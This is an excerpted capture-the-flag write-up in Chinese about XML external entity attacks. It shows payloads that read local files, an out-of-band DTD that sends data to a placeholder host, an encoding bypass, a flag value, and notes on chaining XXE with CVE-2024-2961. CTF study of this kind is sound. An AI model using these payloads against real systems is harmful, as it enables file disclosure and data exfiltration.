...
```
<?xml version="1.0"?>
<?DOCTYPE test [<ENTITY xxe SYSTEM "file:///example">]>
<root>
<user>
&xxe;
</user>
...
```
<!DOCTYPE convert [ 
<!ENTITY % remote SYSTEM "http://ip:port1/file.dtd">
%remote;%int;%send;
]>
```
...
<user><username>1</username><password>123456</password></user>
````

这显然不是jsonfy的形式,不会引出原型链污染

构造payload回显

````
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE test [<!ENTITY a SYSTEM "file:///flag">]>
...
转换方法：wsl上：iconv -f utf-8 -t utf-16BE 114514.xml > 1919.xml

或者:[文件编码转换器](https://never.tools/zh-cn/convert-encoding/)
...
Intro: NSSCTF{6e3671b3-790a-4e9a-8809-41525ed86c60}
````
...
> 压轴小题:这道题你确定考的是web???，不是pwn?

考点：php伪协议+xxe+cve-2024-2961权限提升
...
只要修改<username>标签构造即可

脚本：https://github.com/kezibei/php-filter-iconv

需要xxe带出libc以及/proc/self/maps
